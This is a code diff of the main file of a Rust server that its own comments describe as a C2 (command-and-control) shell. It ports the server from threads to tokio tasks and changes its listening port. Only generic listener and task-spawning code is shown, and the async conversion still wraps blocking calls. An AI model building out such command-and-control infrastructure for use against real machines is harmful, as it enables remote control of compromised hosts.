@@ -1,12 +1,7 @@
 mod client;
 mod terminal;
 
-use std::io::{BufRead, Write};
 use std::net::TcpListener;
-use std::{io, thread};
-use std::error::Error;
-use serde::{Deserialize, Serialize};
-
 
 use client::ClientManager;
 use terminal::{cli_server, handle_client};
@@ -17,26 +12,27 @@ use terminal::{cli_server, handle_client};
 /// Initializes a TCP server that listens on port 49151, manages client connections,
 /// and spawns threads for various tasks including handling client data, listening for
 /// heartbeats, and monitoring client connections.
-fn main() {
-    let listener = TcpListener::bind("0.0.0.0:49151").unwrap();
-    // println!("[I] Server listening on port 49151");
-    io::stdout().flush().unwrap();
+#[tokio::main]
+async fn main() -> tokio::io::Result<()> {
+    let ip_port = "0.0.0.0:8080";
+    let listener = TcpListener::bind(ip_port).unwrap();
 
+    println!("[I] Server listening on {}", ip_port);
+
+    // Client DB
     let client_manager: ClientManager = ClientManager::new();
 
-    // Thread for the C2 Shell
+    // Thread for the C2 CLI Shell
     let server_client_manager_clone = client_manager.clone();
-    thread::spawn(|| cli_server(server_client_manager_clone));
+    tokio::spawn(async move { cli_server(server_client_manager_clone) } );
 
+    // Handle incoming client connections
     for stream in listener.incoming() {
         match stream {
             Ok(stream) => {
                 // Thread that handle the communication with this client
                 let client_manager_clone = client_manager.clone();
-                //let ip = stream.peer_addr().unwrap().to_string();
-                thread::spawn(move || {
-                    handle_client(stream, client_manager_clone);
-                });
+                tokio::spawn(async move { handle_client(stream, client_manager_clone) } );
 
             },
             Err(e) => {
@@ -44,6 +40,8 @@ fn main() {
             }
         }
     }
+
+    Ok(())
 }
 
 
